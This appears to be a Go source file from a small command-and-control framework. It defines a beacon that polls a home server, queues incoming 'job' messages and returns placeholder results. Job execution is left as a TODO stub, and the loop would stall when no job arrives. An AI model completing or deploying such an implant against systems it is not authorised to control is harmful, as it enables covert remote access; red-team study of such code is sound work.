package beacon

import (
	"encoding/json"
	"io"
	"time"

	"github.com/patbcole117/tinyC2/comms"
)

var (
	BEACON_CHANNEL_LIMIT int           = 10
	BEACON_SLEEP_TIME    time.Duration = 3 * time.Second
)

type Beacon struct {
	Name string
	Home string
	OutQ chan Msg
	InQ  chan Msg
	Tx   comms.CommsPackageTX
}

type Msg struct {
	From    string
	Type    string
	Ref     string
	Content string
}

func NewBeacon(n, h, c string) (*Beacon, error) {
	a := &Beacon{
		Name: n,
		Home: h,
		OutQ: make(chan Msg, BEACON_CHANNEL_LIMIT),
		InQ:  make(chan Msg, BEACON_CHANNEL_LIMIT),
	}

	tx, err := comms.NewCommsPackageTX(c)
	if err != nil {
		return nil, err
	}
	a.Tx = tx

	return a, nil
}

func (a *Beacon) Run() {
	for i := 1; i < 5; i++ {
		a.SayHello()
		a.DoNext()
		time.Sleep(BEACON_SLEEP_TIME)
	}
}

func (a *Beacon) SayHello() {
	var m Msg

	select {
	case m = <-a.OutQ:
	default:
		m = Msg{From: a.Name, Type: "nop", Ref: "", Content: ""}
	}

	res, err := a.Tx.SendJSON(a.Home, m)
	if err != nil {
		m = Msg{From: a.Name, Type: "err", Ref: "nil", Content: err.Error()}
		a.OutQ <- m
		return
	}

	body, err := io.ReadAll(res.Body)
	if err != nil {
		m = Msg{From: a.Name, Type: "err", Ref: "nil", Content: err.Error()}
		a.OutQ <- m
		return
	}

	if err = json.Unmarshal(body, &m); err != nil {
		m = Msg{From: a.Name, Type: "err", Ref: "nil", Content: err.Error()}
		a.OutQ <- m
		return
	}

	if m.Type == "job" {
		a.InQ <- m
	}
}

func (a *Beacon) DoNext() {
	m := <-a.InQ
	// Do the thing
	// TODO = result
	a.OutQ <- Msg{From: a.Name, Type: "result", Ref: m.Ref, Content: "TODO"}
}
